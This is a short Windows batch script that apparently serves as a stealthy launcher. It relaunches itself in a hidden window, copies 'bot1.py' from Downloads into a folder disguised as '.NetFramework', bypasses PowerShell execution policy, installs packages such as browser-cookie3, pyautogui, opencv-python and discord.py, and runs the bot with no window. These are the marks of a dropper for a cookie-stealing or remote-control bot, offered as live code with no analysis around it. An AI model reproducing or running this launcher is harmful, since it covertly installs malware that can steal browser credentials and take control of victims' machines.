@echo off
if "%1"=="hidden" goto start
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
exit

:start
setlocal

set "WORKDIR=%LOCALAPPDATA%\.NetFramework"
set "DOWNLOADS=%USERPROFILE%\Downloads"
set "PYFILE=bot1.py"

if not exist "%WORKDIR%" (
    mkdir "%WORKDIR%"
)

if exist "%DOWNLOADS%\%PYFILE%" (
    copy "%DOWNLOADS%\%PYFILE%" "%WORKDIR%" >nul
) else (
    exit /b 1
)

cd /d "%WORKDIR%"

python -m venv venv
if errorlevel 1 exit /b 1

powershell -ExecutionPolicy Bypass -Command ".\venv\Scripts\Activate.ps1; python -m pip install --upgrade pip; pip install requests numpy pillow opencv-python pyautogui psutil pywin32 pycryptodome scipy pytz discord.py browser-cookie3"
if errorlevel 1 exit /b 1

.\venv\Scripts\pythonw.exe "%WORKDIR%\%PYFILE%"

exit